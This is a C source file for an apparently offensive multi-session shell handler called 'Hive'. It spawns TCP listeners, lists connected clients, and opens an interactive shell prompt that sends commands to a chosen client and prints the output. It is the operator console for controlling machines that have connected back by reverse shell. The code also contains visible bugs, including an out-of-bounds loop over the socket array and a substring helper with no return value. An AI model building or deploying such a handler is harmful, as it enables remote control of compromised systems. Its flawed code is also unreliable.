#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>


#define SERVERADDR "0.0.0.0"

int client_sockets[20];
int counter = 0;

char getSubString(char* buff, char* dest, int from, int to) {
	strncpy(dest, buff + from, to);
}

void *server(void *p) {
    int sock, client_socket;
    
    struct sockaddr_in server_address, client_address;
    int i = 0;
    int optval = 1;
    socklen_t client_length;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        printf("Error setting TCP Socket options.\n");
    }
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr(SERVERADDR);
    server_address.sin_port = htons(*(uint16_t *)p);

    bind(sock, (struct sockaddr*) &server_address, sizeof(server_address));
    listen(sock, 5);
    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr*) &client_address, &client_length);
    
    client_sockets[counter] = client_socket;
    counter++;
    printf("Connected\n");

    // while (1) {
    //     jump:
    //     bzero(&buffer, sizeof(buffer));
    //     bzero(&reponse, sizeof(reponse));
    //     printf("[^]Shell#%s: ", inet_ntoa(client_address.sin_addr));
    //     fgets(buffer, sizeof(buffer), stdin);
    //     strtok(buffer, "\n"); //Remove new-line chars.
    //     write(client_socket, buffer, sizeof(buffer));
    //     if (strncmp("q", buffer, 1) == 0) {
	// 		break;
    //     } else {
    //         recv(client_socket, reponse, sizeof(reponse), MSG_WAITALL);
    //         printf("%s", reponse);
    //     }
    // }
}

int main() {
    char user_input_buffer[128];
    char port_command[16];
    int port, session_choice;
    struct sockaddr_in client;
    socklen_t client_size = sizeof(client);

    char buffer[1024];
    char reponse[16836];

    while (1) {
        bzero(&user_input_buffer, sizeof(user_input_buffer));
        bzero(&port_command, sizeof(port_command));
        printf("[^]Hive#: ");
        fgets(user_input_buffer, sizeof(user_input_buffer), stdin);

        if (strncmp("q", user_input_buffer, 1) == 0) {
			break;
        }
        else if (strncmp("show ", user_input_buffer, 5) == 0) {
            getSubString(user_input_buffer, port_command, 5, 15);
            if (strncmp("conns", port_command, 5) == 0) {
                for (int i = 0; i < sizeof(client_sockets); i++) {
                    getsockname(client_sockets[i], (struct sockaddr *) &client, &client_size);
                    if (client_sockets[i] != 0){
                        printf("%d - [%s:%u]\n", i, inet_ntoa(client.sin_addr), ntohs(client.sin_port));
                    }
                }
            }
        }
        else if (strncmp("i ", user_input_buffer, 2) == 0) {
            getSubString(user_input_buffer, port_command, 2, 15);
            session_choice = atoi(port_command);
            while (1){
                bzero(&buffer, sizeof(buffer));
                bzero(&reponse, sizeof(reponse));
                printf("[^]Shell#[%s:%u]: ", inet_ntoa(client.sin_addr), ntohs(client.sin_port));
                fgets(buffer, sizeof(buffer), stdin);
                strtok(buffer, "\n"); //Remove new-line chars.
                write(client_sockets[session_choice], buffer, sizeof(buffer));
                if (strncmp("q", buffer, 1) == 0) {
                    break;
                } else {
                    recv(client_sockets[session_choice], reponse, sizeof(reponse), MSG_WAITALL);
                    printf("%s", reponse);
                }
            }
        }
        else if (strncmp(user_input_buffer, "spawn ", 6) == 0) {   
            pthread_t thread_id;
            getSubString(user_input_buffer, port_command, 6, 15);
            //Inner spawn commands:
            if (strncmp("default", port_command, 7) == 0) {
                printf("Spawned default.\n");
                port = 57890;
                pthread_create(&thread_id, NULL, server, (void *)&port);
            } else {
                port = atoi(port_command);
                printf("Spawned %d.\n", port);
                pthread_create(&thread_id, NULL, server, (void *)&port);
            }
        }
    }
    printf("Bye!\n");
    return 0;
}
